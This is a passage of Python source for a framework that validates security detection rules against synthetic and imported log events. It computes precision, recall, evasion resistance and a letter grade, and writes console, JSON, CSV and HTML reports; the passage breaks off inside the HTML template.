        """True if the field value contains ALL of the given substrings."""
        val = DetectionEngine.nested_get(event, field)
        if case_insensitive:
            val_l = val.lower()
            return all(str(v).lower() in val_l for v in values)
        return all(str(v) in val for v in values)

    # ── String analysis ──────────────────────────────────────────────────────

    @staticmethod
    def field_count(
        event: dict, field: str, pattern: str, case_insensitive: bool = True
    ) -> int:
        """Return how many times *pattern* appears in the field value."""
        val = DetectionEngine.nested_get(event, field)
        return val.lower().count(pattern.lower()) if case_insensitive else val.count(pattern)

    @staticmethod
    def field_length_gt(event: dict, field: str, length: int) -> bool:
        return len(DetectionEngine.nested_get(event, field)) > length

    @staticmethod
    def field_length_lt(event: dict, field: str, length: int) -> bool:
        return len(DetectionEngine.nested_get(event, field)) < length

    # ── Process-tree helpers ─────────────────────────────────────────────────

    @staticmethod
    def check_process_lineage(
        event: dict,
        lineage: list[str],
        image_field:  str  = "Image",
        parent_field: str  = "ParentImage",
        case_insensitive: bool = True,
    ) -> bool:
        """
        Verify that a process matches an expected parent-child lineage.

        Args:
            lineage: Executable names from child → ancestor.
                     e.g. ['rundll32.exe', 'powershell.exe'] means
                     rundll32 should be a child of powershell.

        Returns:
            True if the lineage matches (empty lineage → always True).
        """
        if not lineage:
            return True
        image = DetectionEngine.nested_get(event, image_field)
        child = image.lower() if case_insensitive else image
        needle0 = lineage[0].lower() if case_insensitive else lineage[0]
        if not child.endswith(needle0):
            return False
        if len(lineage) >= 2:
            parent = DetectionEngine.nested_get(event, parent_field)
            parent = parent.lower() if case_insensitive else parent
            needle1 = lineage[1].lower() if case_insensitive else lineage[1]
            if not parent.endswith(needle1):
                return False
        return True

    @staticmethod
    def check_original_filename(
        event: dict, expected_name: str, case_insensitive: bool = True
    ) -> bool:
        """
        Check the OriginalFileName field (Sysmon PE header metadata).
        Catches renamed-binary evasion that Image-only rules miss.
        """
        return DetectionEngine.field_equals(
            event, "OriginalFileName", expected_name, case_insensitive
        )


# ═══════════════════════════════════════════════════════════════════════════════
# GRADING CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

class GradingConfig:
    """
    Configurable weights for the composite score and letter-grade mapping.

    Composite score = (F1 × f1_weight) + (evasion_resistance × evasion_weight)
                    + ((1 − FP_rate) × fp_weight)

    Weights must sum to 1.0 (enforced by validate_weights()).
    """

    def __init__(
        self,
        f1_weight:        float = 0.40,
        evasion_weight:   float = 0.30,
        fp_weight:        float = 0.30,
        grade_thresholds: Optional[dict] = None,
    ):
        self.f1_weight      = f1_weight
        self.evasion_weight = evasion_weight
        self.fp_weight      = fp_weight
        self.grade_thresholds = grade_thresholds or {
            "A": 0.90, "B": 0.80, "C": 0.70, "D": 0.60
        }

    def validate_weights(self) -> None:
        """
        Raise ValidationError if weights do not sum to 1.0 (±0.001 tolerance).

        NEW in v3.
        """
        total = self.f1_weight + self.evasion_weight + self.fp_weight
        if abs(total - 1.0) > 0.001:
            raise ValidationError(
                f"GradingConfig weights must sum to 1.0; got {total:.4f} "
                f"(f1={self.f1_weight}, evasion={self.evasion_weight}, fp={self.fp_weight})"
            )

    def compute_grade(self, score: float) -> str:
        """
        Return a letter grade for the given composite score.

        FIX v3: The previous implementation had two loops — the first loop
        assigned to an unset local variable (UnboundLocalError when score < 0.6)
        and was dead code. Now a single, correct loop is used.
        """
        for grade in ["A", "B", "C", "D"]:
            if score >= self.grade_thresholds.get(grade, 0.0):
                return grade
        return "F"


# ═══════════════════════════════════════════════════════════════════════════════
# TEST RUNNER & REPORTER
# ═══════════════════════════════════════════════════════════════════════════════

class TestRunner:
    """
    Orchestrates testing, computes metrics, and produces validation reports.

    Usage:
        runner = TestRunner(engine, events)
        runner.run()
        print(runner.get_metrics())
        runner.print_report()
    """

    def __init__(
        self,
        engine:  DetectionEngine,
        events:  list[SyntheticEvent],
        grading: Optional[GradingConfig] = None,
    ):
        self.engine  = engine
        self.events  = events
        self.grading = grading or GradingConfig()
        self.results: list[TestResult] = []

    # ── Core execution ───────────────────────────────────────────────────────

    def run(
        self,
        progress_callback: Optional[Callable[[int, int], None]] = None,
    ) -> list[TestResult]:
        """
        Run every event through the detection engine.

        Args:
            progress_callback: Optional callable(current, total) for UI progress
                               bars.  Called after each event is evaluated.
                               NEW in v3.

        Returns:
            List of TestResult objects.
        """
        self.results = []
        total = len(self.events)
        for i, event in enumerate(self.events):
            t0        = time.perf_counter()
            detection = self.engine.evaluate(event.log_data)
            elapsed   = (time.perf_counter() - t0) * 1000
            # engine.evaluate may not set event_id / execution_time; fill them
            detection.event_id          = event.event_id
            detection.execution_time_ms = round(elapsed, 3)
            self.results.append(TestResult(event=event, detection=detection))
            if progress_callback:
                progress_callback(i + 1, total)
        return self.results

    # ── Metrics ──────────────────────────────────────────────────────────────

    def get_metrics(self) -> dict:
        """
        Compute and return all detection quality metrics.

        Auto-runs if results are empty.
        """
        if not self.results:
            self.run()

        counts = Counter(r.outcome for r in self.results)
        tp = counts["TP"]
        fp = counts["FP"]
        tn = counts["TN"]
        fn = counts["FN"]
        total = len(self.results)

        accuracy  = (tp + tn) / total                        if total              else 0.0
        precision = tp / (tp + fp)                           if (tp + fp)          else 0.0
        recall    = tp / (tp + fn)                           if (tp + fn)          else 0.0
        f1        = 2 * precision * recall / (precision + recall) if (precision + recall) else 0.0

        # Evasion sub-metrics
        evasion_events = [r for r in self.results if r.event.category == EventCategory.EVASION]
        evasion_caught = sum(1 for r in evasion_events if r.detection.matched)
        evasion_total  = len(evasion_events)
        # Only compute evasion resistance if we have evasion events; else None
        evasion_resistance = (evasion_caught / evasion_total) if evasion_total else None

        # FP candidate stress test
        fp_candidates       = [r for r in self.results
                                if r.event.category == EventCategory.FALSE_POSITIVE_CANDIDATE]
        fp_cand_triggered   = sum(1 for r in fp_candidates if r.detection.matched)

        # Per-category breakdown
        category_breakdown: dict[str, dict] = {}
        for cat in EventCategory:
            cat_results = [r for r in self.results if r.event.category == cat]
            if cat_results:
                passed = sum(1 for r in cat_results if r.passed)
                category_breakdown[cat.value] = {
                    "total":     len(cat_results),
                    "passed":    passed,
                    "failed":    len(cat_results) - passed,
                    "pass_rate": round(passed / len(cat_results), 4),
                }

        # Composite score & grade
        # FIX v3.1: When no evasion events are present, evasion_resistance is
        # None.  Substituting 1.0 (the old behaviour) silently granted a 30 %
        # free boost to every rule that skipped evasion testing.  Instead, when
        # there are no evasion events the evasion component is excluded entirely
        # and the remaining weights are normalised to sum to 1.0.
        g = self.grading
        if evasion_resistance is not None:
            score = (
                f1        * g.f1_weight
                + evasion_resistance * g.evasion_weight
                + (1 - (fp / max(total, 1))) * g.fp_weight
            )
        else:
            # No evasion events — normalise remaining weights
            remaining = g.f1_weight + g.fp_weight
            if remaining > 0:
                score = (
                    f1 * (g.f1_weight / remaining)
                    + (1 - (fp / max(total, 1))) * (g.fp_weight / remaining)
                )
            else:
                score = 0.0
        grade = g.compute_grade(score)

        avg_time = (sum(r.detection.execution_time_ms for r in self.results) / total
                    if total else 0.0)

        return {
            "confusion_matrix": {"TP": tp, "FP": fp, "TN": tn, "FN": fn},
            "accuracy":         round(accuracy,  4),
            "precision":        round(precision, 4),
            "recall":           round(recall,    4),
            "f1_score":         round(f1,        4),
            # evasion_resistance: float when evasion events exist, None otherwise
            "evasion_resistance":      round(evasion_resistance, 4) if evasion_resistance is not None else None,
            "evasion_caught":          evasion_caught,
            "evasion_total":           evasion_total,
            "fp_candidates_triggered": fp_cand_triggered,
            "fp_candidates_total":     len(fp_candidates),
            "overall_grade":           grade,
            "composite_score":         round(score, 4),
            "total_events":            total,
            "total_passed":            sum(1 for r in self.results if r.passed),
            "total_failed":            sum(1 for r in self.results if not r.passed),
            "category_breakdown":      category_breakdown,
            "avg_execution_time_ms":   round(avg_time, 3),
        }

    # ── Result accessors ─────────────────────────────────────────────────────

    def get_by_outcome(self, outcome: str) -> list[TestResult]:
        """Return all results matching a specific outcome: TP / FP / TN / FN.

        NEW in v3.
        """
        return [r for r in self.results if r.outcome == outcome.upper()]

    def get_failures(self) -> list[TestResult]:
        """Return all results where reality did not match expectation (FP + FN).

        NEW in v3.
        """
        return [r for r in self.results if not r.passed]

    def get_true_positives(self) -> list[TestResult]:
        """Return all TP results. NEW in v3."""
        return self.get_by_outcome("TP")

    def get_false_positives(self) -> list[TestResult]:
        """Return all FP results. NEW in v3."""
        return self.get_by_outcome("FP")

    def get_false_negatives(self) -> list[TestResult]:
        """Return all FN results. NEW in v3."""
        return self.get_by_outcome("FN")

    def get_evasion_missed(self) -> list[TestResult]:
        """Return all evasion variants the rule failed to catch. NEW in v3."""
        return [
            r for r in self.results
            if r.event.category == EventCategory.EVASION and not r.passed
        ]

    def iter_results(self) -> Iterator[TestResult]:
        """Iterate over results without materialising the full list. NEW in v3."""
        yield from self.results

    # ── Console report ───────────────────────────────────────────────────────

    def print_report(self, recommendations: Optional[list[dict]] = None) -> None:
        """
        Print a formatted validation report to stdout.

        Args:
            recommendations: Optional list of recommendation dicts from
                             generate_recommendations() in app.py.
                             When provided, a RECOMMENDATIONS section is printed.
                             NEW in v3 — standalone CLI will auto-generate basic
                             recommendations if this is None.
        """
        if not self.results:
            self.run()

        m  = self.get_metrics()
        cm = m["confusion_matrix"]

        W = 80
        print("=" * W)
        print(f"  DETECTION RULE VALIDATION REPORT  v{__version__}")
        print(f"  Rule    : {self.engine.rule_name}")
        print(f"  Date    : {datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC")
        print(f"  Events  : {m['total_events']}  (seed-reproducible)")
        print("=" * W)

        # Confusion matrix
        print("\n  ┌──────────────────────────────────────────────┐")
        print(  "  │              CONFUSION MATRIX                │")
        print(  "  ├──────────────────────┬───────────────────────┤")
        print(f"  │  True  Positives: {cm['TP']:>3}  │  False Positives: {cm['FP']:>3}  │")
        print(f"  │  False Negatives: {cm['FN']:>3}  │  True  Negatives: {cm['TN']:>3}  │")
        print(  "  └──────────────────────┴───────────────────────┘")

        # Scalar metrics
        ev_r_str = (f"{m['evasion_resistance']:.1%}  ({m['evasion_caught']}/{m['evasion_total']} caught)"
                    if m["evasion_resistance"] is not None else "N/A (no evasion events)")
        print(f"\n  {'─'*50}")
        print(f"  Accuracy          : {m['accuracy']:.1%}")
        print(f"  Precision         : {m['precision']:.1%}")
        print(f"  Recall            : {m['recall']:.1%}")
        print(f"  F1 Score          : {m['f1_score']:.1%}")
        print(f"  Evasion Resistance: {ev_r_str}")
        print(f"  FP Stress Test    : {m['fp_candidates_triggered']}/{m['fp_candidates_total']} triggered")
        print(f"  Avg Eval Time     : {m['avg_execution_time_ms']:.3f} ms")
        print(f"  {'─'*50}")
        print(f"  OVERALL GRADE     : {m['overall_grade']}  (composite {m['composite_score']:.2f})")
        print(f"  Tests Passed      : {m['total_passed']}/{m['total_events']}")
        print(f"  {'─'*50}")

        # Per-category breakdown
        if m.get("category_breakdown"):
            print(f"\n  Per-Category Results:")
            for cat_name, cat_data in m["category_breakdown"].items():
                bar_len = int(cat_data["pass_rate"] * 20)
                bar = "█" * bar_len + "░" * (20 - bar_len)
                print(f"    {cat_name:<22} {cat_data['passed']:>2}/{cat_data['total']:<2} "
                      f"[{bar}] {cat_data['pass_rate']:.0%}")

        # Per-event table
        print(f"\n  {'─'*92}")
        print(f"  {'ID':<10} {'Category':<18} {'Expected':<9} {'Actual':<9} "
              f"{'Conf':>5}  {'Outcome':<6}  Description")
        print(f"  {'─'*92}")
        for r in self.results:
            expected = "DETECT" if r.event.expected_detection else "IGNORE"
            actual   = "DETECT" if r.detection.matched        else "IGNORE"
            conf_str = f"{r.detection.confidence_score:.2f}" if r.detection.matched else "  —  "
            marker   = "✓" if r.passed else "✗"
            cat      = r.event.category.value[:16]
            desc     = r.event.description[:40]
            print(f"  {r.event.event_id:<10} {cat:<18} {expected:<9} {actual:<9} "
                  f"{conf_str:>5}  [{marker}] {r.outcome:<4}  {desc}")

        # Failure details
        failures = self.get_failures()
        if failures:
            print(f"\n{'═'*W}")
            print(f"  FAILURE DETAILS  ({len(failures)} events)")
            print(f"{'═'*W}")
            for r in failures:
                print(f"\n  [{r.outcome}] {r.event.event_id}: {r.event.description}")
                print(f"  Category : {r.event.category.value}")
                if r.event.attack_technique:
                    print(f"  MITRE    : {r.event.attack_technique}")
                if r.event.notes:
                    print(f"  Notes    : {r.event.notes}")
                if r.detection.matched_conditions:
                    print(f"  Matched  : {', '.join(r.detection.matched_conditions[:4])}")
                log_str = json.dumps(r.event.log_data, indent=2)
                if len(log_str) > 600:
                    log_str = log_str[:600] + "\n  …"
                print(f"  Log data :\n{log_str}")

        # Recommendations section
        if recommendations:
            recs_to_show = recommendations
        else:
            recs_to_show = self._basic_recommendations(m)

        if recs_to_show:
            print(f"\n{'═'*W}")
            print(f"  RECOMMENDATIONS  ({len(recs_to_show)} items)")
            print(f"{'═'*W}")
            for rec in recs_to_show:
                pri = rec.get("priority", "info").upper()
                print(f"\n  [{pri}] {rec.get('title','')}")
                if rec.get("body"):
                    for line in rec["body"].splitlines():
                        print(f"    {line}")
                if rec.get("fix"):
                    print(f"  → FIX: {rec['fix'][:120]}")

        print(f"\n{'═'*W}")
        print(f"  END OF REPORT")
        print(f"{'═'*W}\n")

    def _basic_recommendations(self, m: dict) -> list[dict]:
        """
        Generate a minimal set of recommendations from metrics alone
        (no KB required) for standalone CLI use.

        This is a lightweight fallback; app.py uses the full
        generate_recommendations() function with KB grounding.
        """
        recs: list[dict] = []
        cm = m.get("confusion_matrix", {})

        if cm.get("FN", 0) > 0:
            recs.append({
                "priority": "critical",
                "title":    f"{cm['FN']} False Negative(s) — Missed Attacks",
                "body":     f"Recall is {m['recall']:.1%}. The rule missed {cm['FN']} real attack event(s).",
                "fix":      "Widen detection logic: add OR branches, check OriginalFileName, or relax filter conditions.",
            })
        if cm.get("FP", 0) > 0:
            recs.append({
                "priority": "high",
                "title":    f"{cm['FP']} False Positive(s) — Noisy Rule",
                "body":     f"Precision is {m['precision']:.1%}. The rule fired on {cm['FP']} benign event(s).",
                "fix":      "Add exclusion filters for known-good paths, accounts, or process names.",
            })
        missed_evasion = m.get("evasion_total", 0) - m.get("evasion_caught", 0)
        if missed_evasion > 0:
            recs.append({
                "priority": "critical",
                "title":    f"{missed_evasion} Evasion Bypass(es) Detected",
                "body":     f"Evasion resistance: {m.get('evasion_resistance', 0):.1%}.",
                "fix":      "Add OriginalFileName check, use case-insensitive operators, consider base64 decode enrichment.",
            })
        if not recs:
            recs.append({
                "priority": "info",
                "title":    "All tests passed",
                "body":     f"Grade {m['overall_grade']} — composite score {m['composite_score']:.2f}.",
                "fix":      "Re-run periodically as attacker TTPs evolve.",
            })
        return recs

    # ── JSON export ──────────────────────────────────────────────────────────

    def export_report_json(
        self,
        recommendations: Optional[list[dict]] = None,
    ) -> dict:
        """
        Return the full report as a JSON-serialisable dict.

        Args:
            recommendations: Optional list from generate_recommendations().
                             If provided, it is included in the output JSON.
        """
        if not self.results:
            self.run()
        payload: dict[str, Any] = {
            "framework_version": __version__,
            "rule_name":         self.engine.rule_name,
            "rule_metadata":     self.engine.rule_metadata,
            "generated_at":      datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "metrics":           self.get_metrics(),
            "recommendations":   recommendations or self._basic_recommendations(self.get_metrics()),
            "results": [
                {
                    "event_id":           r.event.event_id,
                    "category":           r.event.category.value,
                    "description":        r.event.description,
                    "attack_technique":   r.event.attack_technique,
                    "expected_detection": r.event.expected_detection,
                    "actual_detection":   r.detection.matched,
                    "matched_conditions": r.detection.matched_conditions,
                    "confidence":         r.detection.confidence_score,
                    "execution_time_ms":  r.detection.execution_time_ms,
                    "outcome":            r.outcome,
                    "passed":             r.passed,
                    "log_data":           r.event.log_data,
                    "notes":              r.event.notes,
                    "tags":               r.event.tags,
                    "source":             "real" if "imported" in (r.event.tags or []) else "synthetic",
                }
                for r in self.results
            ],
        }
        return payload

    def export_csv(
        self,
        recommendations: Optional[list[dict]] = None,
    ) -> str:
        """
        Return a CSV string containing metrics, recommendations, and per-event rows.

        Matches the format expected by app.py's build_csv_export().
        NEW in v3.
        """
        if not self.results:
            self.run()
        buf = io.StringIO()
        w   = csv.writer(buf)

        m = self.get_metrics()
        w.writerow(["=== METRICS ==="])
        for k, v in m.items():
            if not isinstance(v, dict):
                w.writerow([k, v])
        w.writerow([])
        cm = m.get("confusion_matrix", {})
        w.writerow(["=== CONFUSION MATRIX ==="])
        for k, v in cm.items():
            w.writerow([k, v])
        w.writerow([])

        recs = recommendations or self._basic_recommendations(m)
        w.writerow(["=== RECOMMENDATIONS ==="])
        w.writerow(["priority", "title", "body", "fix"])
        for r in recs:
            w.writerow([r.get("priority", ""), r.get("title", ""),
                        r.get("body", ""), r.get("fix", "")])
        w.writerow([])

        w.writerow(["=== EVENT RESULTS ==="])
        w.writerow(["event_id", "category", "description", "expected",
                    "actual", "outcome", "passed", "confidence",
                    "matched_conditions", "source", "tags"])
        for r in self.results:
            is_real = "imported" in (r.event.tags or [])
            w.writerow([
                r.event.event_id,
                r.event.category.value,
                r.event.description,
                r.event.expected_detection,
                r.detection.matched,
                r.outcome,
                r.passed,
                f"{r.detection.confidence_score:.2f}",
                "; ".join(r.detection.matched_conditions),
                "real" if is_real else "synthetic",
                ", ".join(r.event.tags or []),
            ])
        return buf.getvalue()

    # ── HTML export ──────────────────────────────────────────────────────────

    def export_html_report(
        self,
        path: str,
        recommendations: Optional[list[dict]] = None,
    ) -> None:
        """
        Write a self-contained HTML validation report to *path*.

        IMPROVED in v3: now includes evasion analysis, category breakdown,
        and a recommendations section — matching app.py's build_html_report().

        Args:
            path:            Output file path.
            recommendations: Optional recs list; auto-generated if None.
        """
        if not self.results:
            self.run()

        m    = self.get_metrics()
        cm   = m["confusion_matrix"]
        recs = recommendations or self._basic_recommendations(m)

        grade       = m["overall_grade"]
        gc_map      = {"A": "#10b981", "B": "#06b6d4", "C": "#f59e0b", "D": "#f97316", "F": "#ef4444"}
        grade_color = gc_map.get(grade, "#ef4444")
        now_str     = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

        # Result rows
        rows_html = ""
        for r in self.results:
            cls     = "pass" if r.passed else "fail"
            badge   = "badge-pass" if r.passed else "badge-fail"
            expected = "DETECT" if r.event.expected_detection else "IGNORE"
            actual   = "DETECT" if r.detection.matched else "IGNORE"
            conf     = f"{r.detection.confidence_score:.2f}" if r.detection.matched else "—"
            real_tag = '<span class="real-badge">REAL</span>' if "imported" in (r.event.tags or []) else ""
            safe_desc = _html.escape(r.event.description[:55])
            rows_html += (
                f'<tr class="{cls}"><td>{_html.escape(r.event.event_id)}</td>'
                f'<td>{_html.escape(r.event.category.value)}</td>'
                f'<td>{safe_desc}{"…" if len(r.event.description) > 55 else ""}'
                f'{real_tag}</td>'
                f'<td>{expected}</td><td>{actual}</td><td>{conf}</td>'
                f'<td><span class="{badge}">{r.outcome}</span></td></tr>\n'
            )

        # Failure cards
        failures_html = ""
        for r in self.get_failures():
            snippet = _html.escape(json.dumps(r.event.log_data, indent=2)[:700])
            conds   = _html.escape(", ".join(r.detection.matched_conditions[:3]) or "none matched")
            failures_html += (
                f'<div class="failure-card">'
                f'<h4>[{r.outcome}] {_html.escape(r.event.event_id)}: {_html.escape(r.event.description)}</h4>'
                f'<p><b>Category:</b> {_html.escape(r.event.category.value)}'
                f' &nbsp;|&nbsp; <b>MITRE:</b> {_html.escape(r.event.attack_technique or "N/A")}</p>'
                f'<p><b>Notes:</b> {_html.escape(r.event.notes or "N/A")}</p>'
                f'<p><b>Matched conditions:</b> {conds}</p>'
                f'<pre>{snippet}</pre></div>\n'
            )

        # Evasion breakdown
        evasion_results = [r for r in self.results if r.event.category == EventCategory.EVASION]
        evasion_html = ""
        for r in evasion_results:
            cls  = "ev-caught" if r.passed else "ev-missed"
            icon = "✓" if r.passed else "✗"
            evasion_html += (
                f'<div class="{cls}">'
                f'<span class="ev-icon">{icon}</span>'
                f' <strong>{_html.escape(r.event.description)}</strong>'
                f' <span class="ev-tags">{_html.escape(", ".join(r.event.tags or []))}</span>'
                f'{"<br><em>" + _html.escape(r.event.notes) + "</em>" if r.event.notes else ""}'
                f'</div>\n'
            )

        # Category breakdown
        cat_html = ""
        cat_colors = {
            "true_positive": "#10b981", "true_negative": "#06b6d4",
            "fp_candidate":  "#f59e0b", "evasion":       "#8b5cf6",
        }
        for cat_name, cat_data in m.get("category_breakdown", {}).items():
            clr  = cat_colors.get(cat_name, "#94a3b8")
            pct  = int(cat_data["pass_rate"] * 100)
            cat_html += (
                f'<div class="cat-row">'
                f'<span class="cat-name" style="color:{clr}">'
                f'{cat_name.replace("_", " ")}</span>'
                f'<div class="cat-bar-wrap">'
                f'<div class="cat-bar" style="width:{pct}%;background:{clr}"></div></div>'
                f'<span class="cat-rate">{cat_data["passed"]}/{cat_data["total"]} '
                f'({cat_data["pass_rate"]:.0%})</span>'
                f'</div>\n'
            )

        # Recommendations
        pri_colors = {
            "critical": "#ef4444", "high": "#f97316",
            "medium":   "#f59e0b", "low":  "#10b981", "info": "#06b6d4",
        }
        recs_html = ""
        for rec in recs:
            c = pri_colors.get(rec.get("priority", "info"), "#94a3b8")
            recs_html += (
                f'<div class="rec-card" style="border-left-color:{c}">'
                f'<div class="rec-header">'
                f'<span class="rec-badge" style="background:{c}22;color:{c};border:1px solid {c}44">'
                f'{_html.escape(rec.get("priority","info").upper())}</span> '
                f'<strong>{_html.escape(rec.get("title",""))}</strong></div>'
                f'<p class="rec-body">{_html.escape(rec.get("body",""))}</p>'
                f'<div class="rec-fix"><span style="color:{c}">FIX →</span> {_html.escape(rec.get("fix",""))}</div>'
                f'</div>\n'
            )

        ev_r_str = (f'{m["evasion_resistance"]:.1%} ({m["evasion_caught"]}/{m["evasion_total"]} caught)'
                    if m["evasion_resistance"] is not None else "N/A")
        ev_r_pct = f'{m["evasion_resistance"]:.0%}' if m["evasion_resistance"] is not None else "N/A"
        critical_n = sum(1 for r in recs if r.get("priority") in ("critical", "high"))
        imported_n = sum(1 for r in self.results if "imported" in (r.event.tags or []))
        safe_rule_name = _html.escape(self.engine.rule_name)

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Validation Report — {safe_rule_name}</title>
<style>
*, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
       max-width: 1100px; margin: 0 auto; padding: 2rem 1.5rem 4rem;
       background: #0f172a; color: #e2e8f0; line-height: 1.6; }}
h1   {{ color: #f8fafc; font-size: 1.5rem; font-weight: 800; margin-bottom: .3rem; }}
h2   {{ color: #94a3b8; font-size: .72rem; letter-spacing: 3px; text-transform: uppercase;
       border-bottom: 1px solid #1e293b; padding-bottom: .5rem; margin: 2rem 0 1rem; }}
.meta   {{ font-size: .8rem; color: #475569; margin-bottom: 1.5rem; }}
.alert  {{ background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.25);
          border-radius: 8px; padding: .75rem 1rem; margin: .75rem 0;
          color: #fca5a5; font-size: .85rem; }}
.summary-row {{ display: flex; align-items: center; gap: 2rem;
               background: #0f1e33; border: 1px solid #1e3a5f;
               border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; flex-wrap: wrap; }}
.grade {{ font-size: 5rem; font-weight: 900; color: {grade_color};
          text-shadow: 0 0 30px {grade_color}44; line-height: 1; }}
.si .sv {{ font-size: 1.8rem; font-weight: 800; color: {grade_color}; line-height: 1; }}
.si .sl {{ font-size: .62rem; color: #475569; text-transform: uppercase; letter-spacing: 2px; margin-top: 4px; }}
.metrics-grid {{ display: grid; grid-template-columns: repeat(auto-fit,minmax(150px,1fr)); gap: .75rem; }}
.mc {{ background: #1e293b; border-radius: 8px; padding: 1rem; text-align: center; border: 1px solid #334155; }}
.mc .v {{ font-size: 1.6rem; font-weight: 700; color: #f8fafc; }}
.mc .l {{ font-size: .72rem; color: #64748b; margin-top: .25rem; }}
.pbar-w {{ background: #0f172a; border-radius: 100px; height: 4px; margin-top: .5rem; overflow: hidden; }}
.pbar-f {{ height: 100%; border-radius: 100px; }}
.cm-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: .5rem; max-width: 360px; margin: 1rem 0; }}
.cm-cell {{ padding: 1.2rem; border-radius: 8px; text-align: center; font-weight: 800; font-size: 1.4rem; }}
.cm-tp {{ background: #14532d; color: #bbf7d0; }}
.cm-fp {{ background: #7f1d1d; color: #fecaca; }}
.cm-fn {{ background: #78350f; color: #fed7aa; }}
.cm-tn {{ background: #1e3a5f; color: #bfdbfe; }}
.cm-sub {{ font-size: .62rem; font-weight: 400; opacity: .7; display: block; margin-top: 4px;
           letter-spacing: 1px; text-transform: uppercase; }}
.cat-row {{ display: flex; align-items: center; gap: 12px; margin: .4rem 0; font-size: .84rem; }}
.cat-name {{ min-width: 140px; font-weight: 600; }}
.cat-bar-wrap {{ flex: 1; background: #1e293b; border-radius: 100px; height: 6px; overflow: hidden; }}
.cat-bar {{ height: 100%; border-radius: 100px; }}
.cat-rate {{ font-size: .78rem; color: #475569; white-space: nowrap; }}
table {{ width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: .84rem; }}
th {{ background: #1e293b; color: #94a3b8; padding: .6rem .8rem; text-align: left;
     font-size: .7rem; letter-spacing: 1px; text-transform: uppercase; }}
td {{ padding: .5rem .8rem; border-bottom: 1px solid #0f172a; }}
tr.pass {{ background: #060d16; }} tr.fail {{ background: #110a0a; }}
tr:hover {{ background: #0f1a2e !important; }}
.badge-pass {{ background: #14532d; color: #bbf7d0; padding: 2px 8px; border-radius: 4px;
               font-weight: 700; font-size: .72rem; }}
.badge-fail {{ background: #7f1d1d; color: #fecaca; padding: 2px 8px; border-radius: 4px;
               font-weight: 700; font-size: .72rem; }}
.real-badge {{ font-size: .68rem; font-weight: 700; text-transform: uppercase;
               color: #2dd4bf; background: rgba(20,184,166,.1);
               border: 1px solid rgba(20,184,166,.25); border-radius: 3px;
               padding: 1px 5px; margin-left: 5px; }}
.failure-card {{ background: #0f0a12; border-left: 3px solid #ef4444;
                 padding: 1rem 1.2rem; margin: .6rem 0; border-radius: 0 8px 8px 0; }}
.failure-card h4 {{ color: #fca5a5; margin-bottom: .4rem; font-size: .88rem; }}
.failure-card p {{ font-size: .8rem; color: #94a3b8; margin: .2rem 0; }}
pre {{ background: #06090f; padding: .75rem; border-radius: 6px; overflow-x: auto;
       font-size: .72rem; color: #64748b; border: 1px solid #1e293b; max-height: 220px;
       overflow-y: auto; margin-top: .5rem; }}
.ev-caught, .ev-missed {{ padding: .4rem .8rem; border-radius: 6px; margin: .3rem 0;
                           font-size: .84rem; }}
.ev-caught {{ background: rgba(16,185,129,.08); border: 1px solid rgba(16,185,129,.2); }}
.ev-missed {{ background: rgba(239,68,68,.08);  border: 1px solid rgba(239,68,68,.2); }}
.ev-icon {{ font-weight: 800; margin-right: 6px; }}
.ev-caught .ev-icon {{ color: #10b981; }}
.ev-missed .ev-icon {{ color: #ef4444; }}
.ev-tags {{ font-size: .72rem; color: #475569; margin-left: 8px; }}
.rec-card {{ background: #0a1628; border-left: 3px solid #06b6d4; padding: 1rem 1.2rem;
             margin: .6rem 0; border-radius: 0 8px 8px 0; }}
.rec-header {{ display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }}
.rec-badge {{ font-size: .68rem; font-weight: 800; letter-spacing: 1px; text-transform: uppercase;
              padding: 2px 8px; border-radius: 4px; }}
.rec-body {{ font-size: .82rem; color: #8096b0; line-height: 1.7; margin: 4px 0 8px; }}
.rec-fix {{ font-size: .82rem; color: #64748b; background: rgba(0,0,0,.2);
            border-radius: 6px; padding: 6px 10px; }}
</style>
</head>
<body>
<h1>Detection Rule Validation Report</h1>
<div class="meta">
  Rule: <strong>{safe_rule_name}</strong>
  &nbsp;·&nbsp; Generated: {now_str}
  &nbsp;·&nbsp; Framework v{__version__}
  &nbsp;·&nbsp; {m["total_events"]} events tested
  {f' &nbsp;·&nbsp; <span style="color:#2dd4bf">{imported_n} real logs</span>' if imported_n else ""}
</div>

{f'<div class="alert">⚠ {critical_n} critical/high recommendation(s) require attention before production deployment.</div>' if critical_n else ""}

<div class="summary-row">
  <div><div class="grade">{grade}</div></div>
  <div class="si"><div class="sv">{m["composite_score"]:.0%}</div><div class="sl">Composite</div></div>
  <div class="si"><div class="sv">{m["precision"]:.0%}</div><div class="sl">Precision</div></div>
  <div class="si"><div class="sv">{m["recall"]:.0%}</div><div class="sl">Recall</div></div>
  <div class="si"><div class="sv">{m["f1_score"]:.0%}</div><div class="sl">F1 Score</div></div>
  <div class="si"><div class="sv">{ev_r_pct}</div><div class="sl">Evasion</div></div>
  <div class="si"><div class="sv">{m["total_passed"]}/{m["total_events"]}</div><div class="sl">Passed</div></div>
</div>

<h2>Metrics</h2>
<div class="metrics-grid">
{"".join(
    f'<div class="mc"><span class="v">{val:.1%}</span><div class="l">{lbl}</div>'
    f'<div class="pbar-w"><div class="pbar-f" style="width:{val*100:.0f}%;background:{clr}"></div></div></div>'
    for lbl, val, clr in [
        ("Accuracy",           m["accuracy"],                        "#06b6d4"),
        ("Precision",          m["precision"],                       "#10b981"),
        ("Recall",             m["recall"],                          "#10b981"),
        ("F1 Score",           m["f1_score"],                        "#8b5cf6"),
        ("Evasion Resistance", m["evasion_resistance"] if m["evasion_resistance"] is not None else 0.0, "#f59e0b"),
        ("Composite Score",    m["composite_score"],                 grade_color),
    ]
)}
</div>

<h2>Confusion Matrix</h2>
<div class="cm-grid">
  <div class="cm-cell cm-tp">{cm["TP"]}<span class="cm-sub">True Positives</span></div>
